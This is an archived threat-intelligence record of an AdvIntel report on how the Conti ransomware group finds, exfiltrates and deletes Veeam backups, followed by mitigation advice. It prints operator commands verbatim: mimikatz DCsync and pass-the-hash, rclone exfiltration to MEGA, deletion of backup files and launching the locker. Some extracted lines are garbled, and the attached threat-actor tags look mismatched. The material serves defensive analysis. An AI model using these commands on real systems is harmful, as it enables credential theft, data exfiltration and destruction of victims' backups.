{
    "id": "4ebff4ce-24e4-4670-850b-ef95da308175",
    "created_at": "2023-01-12T15:10:11.465502Z",
    "updated_at": "2025-03-27T02:15:49.338842Z",
    "deleted_at": null,
    "sha1_hash": "3ec43dbf769f6105b906dce74315b7f041d49317",
    "title": "2021-09-29 - Backup “Removal” Solutions - From Conti Ransomware With Love",
    "authors": "",
    "file_creation_date": "2022-05-28T04:46:05Z",
    "file_modification_date": "2022-05-28T04:46:05Z",
    "file_size": 1642729,
    "plain_text": "# Backup “Removal” Solutions - From Conti Ransomware With Love\n\n**advintel.io/post/backup-removal-solutions-from-conti-ransomware-with-love**\n\nAdvIntel September 29, 2021\n\nSep 29, 2021\n\n5 min read\n\n**_By Vitali Kremez & Yelisey Boguslavskiy_**\n\n_This redacted report is based on our actual proactive victim breach intelligence and subsequent incident response (not a simulated or sandbox_\n_environment) identified via unique high-value Conti ransomware collections at AdvIntel via our product “Andariel.”_\n\n**Key Takeaways**\n\nBackups are a major obstacle for any ransomware operation as they allow the victim to resume business by performing data recovery\ninstead of paying ransom to the criminals.\n\nCyber groups specifically target backup solutions in order to ensure that the victim has no other option except for paying the ransom.\nConti group is particularly methodical in developing and implementing backup removal techniques.\n\n\n-----\n\nCo t s tact cs a e based o ut g t e s s o t e et o t ude s o pe teste s o de to e su e to ta get o p e se a d c oud\nbackup solutions. Conti hunts for Veeam privileged users and services and leverages to access, exfiltrate, remove and encrypt backups\nto ensure ransomware breaches are un-”backupable”. This way, Conti simultaneously exfiltrated the data for further victim blackmailing,\nwhile leaving the victim with no chances to quickly recover their files as the backups are removed.\n\nMaintaining developed protocols of access rights hierarchy, network security, and password hygiene, as well as systemic network\nmonitoring aimed at spotting abnormal network behavior may significantly reduce the chances of Conti successfully removing backups.\nSecure backup solutions and mitigations listed will enable any possible victims to leave Conti without their demanded ransom money.\n\n**Introduction**\n\nConti is a top-tier Russian-speaking ransomware group specializing in double extortion operations of simultaneous data encryption and data\nexfiltration. Though Conti does utilize the blackmailing aspect of data exfiltration, threatening the victims to publish stolen files, if the ransom is\nnot paid, the main leverage in Conti negotiations is data encryption based on our deeper visibility.\n\nAccording to AdvIntel sensitive source intelligence, Conti builds their negotiations strategies based on the premise that the majority of targets\nwho pay the ransom are motivated primarily by the need to restore their data while preventing data publishing from being is their secondary\ngoal. If the victim has the ability to restore the files via backups, the chances of successful ransom payment to Conti will be minimized, even\ndespite the fact that the risk of data publishing persists.\n\nAs a result, in order to ensure payments, Conti became strategic in addressing this major obstacle and developed a methodology to remove\nbackups in order to force ransomware payment.\n\n**Conti’s Holistic Vision for Attack Anatomy**\n\nConti’s “backup removal solutions” begin on the team development level. While selecting network intruders for their divisions also known as\n“teams”, Conti is particularly clear that experience related to backup identification, localization, and deactivation is among their top priorities for\na successful pentester. This backup focus implemented within the partnership-building process enables Conti to assemble teams, equipped\nwith knowledge and skills aimed at backup removal.\n\nThe most novel tactics developed by such teams are centered around Veeam backup software. Veeam is a backup, recovery, and data\nmanagement solutions platform for cloud, virtual, and physical environments.\n\n\n-----\n\n**Weaponized Creativity**\n\n_Cobalt Strike via Corporation Breach Study_\n\nRoutinely, Conti initiates their attacks via spam messages with direct Cobalt Strike beacon backdoor delivery. The targeted spam campaigns\nare meticulously designed on selective research of the prospective target, adverse media about them, their executives, and employees. These\ncampaigns are set to ensure that the spam emails are being opened and Cobalt Strike beacons are executed.\n\nConti maintains their approach and attack methods during the next step of attack when they leverage the Atera module as well as Ngrok\n[application to establish persistence. As previously reported by AdvIntel Conti is leveraging a legitimate remote management agent Atera to](https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent)\nsurvive possible Cobalt Strike detections from the endpoint detection and response platform. Relying on the legitimate tool to achieve\npersistence is a core idea leverage by the ransomware pentesting team. The same can be applied to Ngrok, which Conti leverages in order to\nestablish a tunnel to the localhost which will serve as a path for data exfiltration.\n\n\n-----\n\n[The data exfiltration itself is typically done via Rclone weaponization. Rclone config is created and an external location (e.g, MEGA or FTP) for](https://www.advintel.io/post/hunting-for-corporate-insurance-policies-indicators-of-ransom-exfiltrations)\ndata synchronization (data cloning) is established. Conti will prioritize data based on network shares with a specific aim at documentation\nrelated to finance, legal, accounting, insurance, and Information Technology.\n\nThen, finally, Conti pursues that the victim will not be able to recover - they lock the system and the backups and make sure the backups are\nremoved. This can be illustrated by the 2021 Cobalt Strike Beacon Backdoor campaign which AdvIntel observed.\n\n\n-----\n\n_Cobalt Strike Backup Removal Sequence_\n\n**I. Mimikatz and DCsync of Veeam users**\n\nrun mimikatz's @lsadump::dcsync /domain:VICTIMORG.local /all /csv\n\n**II. Find privileged users for Veeam service**\n\nSharpView.exe Find-DomainUserLocation -UserIdentity svc-Veeam\n\nSharpView.exe Get-DomainGPOComputerLocalGroupMapping -ComputerName svc-Veeam\n\nSharpView.exe Get-NetLoggedon -ComputerName svc-Veeam\n\n**III. Impersonate a privileged backup user and establish Veeam backup privileges**\n\na. Clear text password and create a token if the password can be obtained as clear text\n\nmake_token VICTIMORG.local\\svc-Veeam <PASSWORD>\n\nb. Pass-The-Hash technnque:\n\nrun mimikatz's sekurlsa::pth /user:svc-Veeam /domain:VICTIMORG.local /ntlm:HASH /run:\"%COMSPEC% /c echo <VALUE> > \\\\.\\pipe\\\n<VALUE>\"\n\n**IV. Download Veeam backups configurations**\n\ndownload\nc:\\Users\\administrator.VICTIMORG\\AppData\\Roaming\\Veeam_Software_Group_GmbH\\Veeam.EndPoint.Tray.exe_Url_<ID>\\1.0.0.0\\user.con\n\n**V. Download Veeam Guest Helper logs**\n\ndownload \\\\VICTIMORG.local\\C$\\ProgramData\\Veeam\\Backup\\VeeamGuestHelper_<DATE>.log\n\n**VI. Exfiltration Veeam Backups via Rclone**\n\nshell rclone.exe copy --max-age 2y \"\\\\VEEAM.VICTIMORG.local\\\" mega:VEEAM -q --ignore-existing --auto-confirm --multi-threadstreams 7 --transfers 7 --bwlimit 10M\n\n\n-----\n\n**a ua** **e** **o a o** **eea** **ac ups** **b**\n\nrm D:\\VeeamBackup\\VICTIMORG backup\\VICTIMORG<DATE>.vbk\n\n**VIII. Conti locker of Veeam-designated local domains**\n\nshell start C:\\locker.exe -m -net -size 10 -nomutex -p \\\\VEEAM.VICTIMORG.local\\<DRIVE>$\\Backups\n\nAs demonstrated above, with the Veeam account compromise Conti has a method to deal with backup software to “force” ransom payment.\n\n**Veeam Mitigation & Statement on How to Harden Installations:**\n\n_When the attackers have access to the domain admin account there is little [Veeam] can do to protect our installation. That's why [Veeam]_\n_usually recommend using a separate domain to run backup software, this could protect [Veeam] instance in case of the primary domain is_\n_compromised._\n\n_Another approach to protect from ransomware would be to use immutable repositories, they can be considered safe (if configured correctly),_\n_because they allow only appending new data, not altering/purging existing backups._\n\n**Mitigations & Recommendation**\n\nTo prevent Conti backup removal attacks, a holistic mitigation framework should be applied:\n\n1. To prevent the attack initiations, employee training, and email security protocols should be implemented. Conti uses very developed\n\nsocial engineering techniques in order to convince the victim employees that the targeted emails are legitimated.\n\n2. Sometimes Conti uses corporate VPN compromise and TrickBot delivery as an alternative means for attack initiation. Tracking externally\n\nexposed endpoints is therefore critical.\n\n3. To prevent lateral movement, network hierarchy protocols and should be implemented with network segregation and decentralization.\n\n4. Audit and/or block command-line interpreters by using whitelisting tools, like AppLocker or Software Restriction Policies with the focus on\n\nany suspicious “curl” command and unauthorized “.msi” installer scripts particularly those from C:\\ProgramData and C:\\Temp directory\n\n5. Rclone and other data exfiltration command-line interface activities can be captured through proper logging of process execution with\n\ncommand-line arguments.\n\n6. Special security protocol, password update, and account security measures for Veeam should be implemented to prevent Veeam\n\naccount takeover. Enabled backups tremendously decrease Conti’s ransom demands and can likely lead to data recovery with zero\npayments to the Conti collective.\n\n**Disrupt ransomware attacks & prevent data stealing with AdvIntel’s threat disruption solutions. Sign up for AdvIntel services and get**\n**the most actionable intel on impending ransomware attacks, adversarial preparations for data stealing, and ongoing network**\n**investigation operations by the most elite cybercrime collectives.**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-29 - Backup “Removal” Solutions - From Conti Ransomware With Love.pdf"
    ],
    "report_names": [
        "2021-09-29 - Backup “Removal” Solutions - From Conti Ransomware With Love.pdf"
    ],
    "threat_actors": [
        {
            "id": "838f6ced-12a4-4893-991a-36d231d96efd",
            "created_at": "2022-10-25T15:50:23.347455Z",
            "updated_at": "2025-03-27T02:00:55.449316Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "Andariel",
                "Silent Chollima",
                "PLUTONIUM",
                "Onyx Sleet"
            ],
            "source_name": "MITRE:Andariel",
            "tools": [
                "Rifdoor",
                "gh0st RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "110e7160-a8cc-4a66-8550-f19f7d418117",
            "created_at": "2023-01-06T13:46:38.427592Z",
            "updated_at": "2025-03-27T02:00:02.830659Z",
            "deleted_at": null,
            "main_name": "Silent Chollima",
            "aliases": [
                "Subgroup: Andariel",
                "Onyx Sleet",
                "PLUTONIUM",
                "OperationTroy",
                "Guardian of Peace",
                "GOP",
                "WHOis Team",
                "Andariel"
            ],
            "source_name": "MISPGALAXY:Silent Chollima",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4a502340-ae29-4a3a-8142-7fbbc2ec79b5",
            "created_at": "2024-05-01T02:03:08.138302Z",
            "updated_at": "2025-03-27T02:05:17.416542Z",
            "deleted_at": null,
            "main_name": "NICKEL HYATT",
            "aliases": [
                "Dark Seoul",
                "Jumpy Pisces ",
                "Onyx Sleet ",
                "RIFLE Campaign",
                "Silent Chollima ",
                "Andariel"
            ],
            "source_name": "Secureworks:NICKEL HYATT",
            "tools": [
                " DTrack",
                " Rifle",
                " UnitBot",
                " Valefor",
                "ActiveX 0-day"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bc6e3644-3249-44f3-a277-354b7966dd1b",
            "created_at": "2022-10-25T16:07:23.760559Z",
            "updated_at": "2025-03-27T02:02:09.968605Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "APT 45",
                "Andariel",
                "Jumpy Pisces",
                "Onyx Sleet",
                "Operation BLACKMINE",
                "Operation BLACKSHEEP/Phase 3.",
                "Operation Blacksmith",
                "Operation DESERTWOLF/Phase 3",
                "Operation GHOSTRAT",
                "Operation GoldenAxe",
                "Operation INITROY/Phase 1",
                "Operation INITROY/Phase 2",
                "Operation Mayday",
                "Operation VANXATM",
                "Operation XEDA",
                "Plutonium",
                "Silent Chollima",
                "Stonefly"
            ],
            "source_name": "ETDA:Andariel",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536211,
    "ts_updated_at": 1743041749,
    "ts_creation_date": 1653713165,
    "ts_modification_date": 1653713165,
    "files": {
        "pdf": "https://archive.orkl.eu/3ec43dbf769f6105b906dce74315b7f041d49317.pdf",
        "text": "https://archive.orkl.eu/3ec43dbf769f6105b906dce74315b7f041d49317.txt",
        "img": "https://archive.orkl.eu/3ec43dbf769f6105b906dce74315b7f041d49317.jpg"
    }
}